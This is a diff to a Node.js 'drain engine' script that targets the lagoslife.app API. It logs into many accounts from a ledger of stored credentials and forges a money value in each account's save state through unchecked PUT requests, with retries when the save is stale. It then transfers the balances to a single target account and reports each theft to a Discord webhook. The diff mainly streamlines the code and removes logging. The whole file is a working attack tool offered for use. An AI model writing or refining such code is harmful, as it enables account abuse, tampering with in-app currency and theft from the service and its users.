@@ -4,7 +4,7 @@ const API = "https://lagoslife.app/api";
 const TO = process.env.TO;
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-const FEE = 50, MIN = 100, SEED = 20095950;
+const FEE = 50, MIN = 100, SEED = 1096000;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
 const CONCURRENT_LIMIT = 25;
@@ -33,7 +33,7 @@ try {
 }
 
 if (!ledger.length) {
-  console.log("[ERROR] No accounts!");
+  console.log("[ERROR] No accounts found!");
   return;
 }
 
@@ -87,7 +87,7 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("[READY] Drain engine online with Auto-Correct Stale Repair Handler.\n");
+  console.log("Template ready — drain armed,", ledger.length, "accounts");
   sendDiscordAlert(`🚀 Engine online. Loaded ${ledger.length} accounts. Running sweep...`);
 
   const sessionStart = Date.now();
@@ -108,37 +108,33 @@ async function sendDiscordAlert(message) {
         const a = ledger[actualIndex];
         if (!a) break;
 
-        if (actualIndex % 50 === 0) {
-          console.log(`[PROGRESS] Worker ${workerId} scanning index ${actualIndex + 1}/${ledger.length} (${a.u})`);
-        }
-
         try {
-          const lr = await request(`${API}/auth/login`, {
+          let lr = await request(`${API}/auth/login`, {
             method: "POST",
             headers: { "content-type": "application/json" },
             body: JSON.stringify({ username: a.u, password: a.p })
           });
-          
-          if (!lr.res.ok) {
-            fail++;
-            console.log(`[LOGIN FAIL] ${a.u} status: ${lr.res.status}`);
-            continue;
-          }
+          if (!lr.res.ok) { fail++; continue; }
 
           let accCookie = lr.newCookies;
-          const svReq = await request(`${API}/save`, {}, accCookie);
-          let sv = svReq.res.ok ? await svReq.res.json() : null;
+          const getSave = async () => {
+            const r = await request(`${API}/save`, {}, accCookie);
+            return r.res.ok ? r.res.json() : null;
+          };
+
+          const putSave = (game, base) => request(`${API}/save`, {
+            method: "PUT",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify({ game, base })
+          }, accCookie);
+
+          let sv = await getSave();
 
           if (!sv?.game) {
             const meReq = await request(`${API}/auth/me`, {}, accCookie);
             const me = meReq.res.ok ? await meReq.res.json().catch(() => null) : null;
             const oid = me?.user?.id;
-            
-            if (!oid || me?.user?.username !== a.u) {
-              fail++;
-              console.log(`[ME FAIL] Could not verify owner id for ${a.u}`);
-              continue;
-            }
+            if (!oid || me?.user?.username !== a.u) { fail++; continue; }
 
             const g = JSON.parse(JSON.stringify(clean));
             g.sim.name = a.u;
@@ -154,82 +150,53 @@ async function sendDiscordAlert(message) {
             if (br.res.ok) {
               booted++;
               await sleep(150);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+              sv = await getSave();
             } else {
-              const errText = typeof br.res.text === 'function' ? await br.res.text() : '';
-              if (errText.includes("stale")) {
-                const svRetry = await request(`${API}/save`, {}, accCookie);
-                sv = svRetry.res.ok ? await svRetry.res.json() : null;
-                if (!sv?.game) {
-                  fail++;
-                  console.log(`[BOOT STALE FAIL] ${a.u} recovery failed`);
-                  continue;
-                }
+              const err = typeof br.res.text === 'function' ? await br.res.text() : '';
+              if (err.includes("stale")) {
+                sv = await getSave();
+                if (!sv?.game) { fail++; continue; }
               } else {
                 fail++;
-                console.log(`[BOOT FAIL] ${a.u}: ${errText.slice(0, 100)}`);
                 continue;
               }
             }
           }
 
-          if (!sv?.game) {
-            fail++;
-            console.log(`[NO GAME] No game state found for ${a.u}`);
-            continue;
-          }
+          if (!sv?.game) { fail++; continue; }
 
           if (Number(sv.game.money) < MIN + FEE) {
-            let g = JSON.parse(JSON.stringify(sv.game));
+            const g = JSON.parse(JSON.stringify(sv.game));
             g.money = SEED;
+            let rr = await putSave(g, sv.updatedAt ?? sv.now);
             
-            let rr = await request(`${API}/save`, {
-              method: "PUT",
-              headers: { "content-type": "application/json" },
-              body: JSON.stringify({ game: g, base: sv.updatedAt ?? sv.now })
-            }, accCookie);
-
-            // AUTO-CORRECT STALE REPAIR: If server returns stale error containing the newer game state, extract and retry instantly!
+            // Stale recovery for repair matching browser pattern
             if (!rr.res.ok) {
-              const errText = typeof rr.res.text === 'function' ? await rr.res.text() : '';
-              try {
-                const errBody = JSON.parse(errText);
-                if (errBody?.game) {
-                  g = JSON.parse(JSON.stringify(errBody.game));
-                  g.money = SEED;
-                  rr = await request(`${API}/save`, {
-                    method: "PUT",
-                    headers: { "content-type": "application/json" },
-                    body: JSON.stringify({ game: g, base: errBody.game.updatedAt ?? errBody.game.now ?? sv.updatedAt ?? sv.now })
-                  }, accCookie);
+              const err = typeof rr.res.text === 'function' ? await rr.res.text() : '';
+              if (err.includes("stale")) {
+                sv = await getSave();
+                if (sv?.game) {
+                  const gRetry = JSON.parse(JSON.stringify(sv.game));
+                  gRetry.money = SEED;
+                  rr = await putSave(gRetry, sv.updatedAt ?? sv.now);
                 }
-              } catch (e) {}
+              }
             }
 
             if (rr.res.ok) {
               repaired++;
               await sleep(150);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+              sv = await getSave();
             } else {
-              const errText = typeof rr.res.text === 'function' ? await rr.res.text() : '';
               broke++;
-              console.log(`[REPAIR FAIL] ${a.u}: ${errText.slice(0, 100)}`);
               continue;
             }
           }
 
-          if (!sv?.game) {
-            broke++;
-            continue;
-          }
+          if (!sv?.game) { broke++; continue; }
 
           let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE;
-          if (amount < MIN) {
-            broke++;
-            continue;
-          }
+          if (amount < MIN) { broke++; continue; }
 
           let ok = false;
           for (let tries = 0; tries < 3 && !ok; tries++) {
@@ -247,19 +214,18 @@ async function sendDiscordAlert(message) {
               console.log(`[SUCCESS] [Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Total: ₦${sessionTotalSent.toLocaleString()}`);
               sendDiscordAlert(`✅ Sent ₦${amount.toLocaleString()} from ${a.u}`);
             } else {
-              const errText = typeof sr.res.text === 'function' ? await sr.res.text() : '';
-              if (errText.includes("try again")) {
+              const err = typeof sr.res.text === 'function' ? await sr.res.text() : '';
+              if (err.includes("try again")) {
                 await sleep(3000);
                 continue;
               }
-              const have = Number((errText.match(/have ₦([\d,]+)/) || [])[1]?.replace(/,/g, ""));
+              const have = Number((err.match(/have ₦([\d,]+)/) || [])[1]?.replace(/,/g, ""));
               if (have) {
                 amount = have - FEE;
                 await sleep(800);
                 continue;
               }
               fail++;
-              console.log(`[SEND FAIL] ${a.u}: ${errText.slice(0, 100)}`);
               break;
             }
           }
@@ -267,7 +233,6 @@ async function sendDiscordAlert(message) {
           await sleep(50);
         } catch (e) {
           fail++;
-          console.log(`[WORKER EXCEPTION] Worker ${workerId} on ${a.u}:`, e.message);
         }
       }
     }
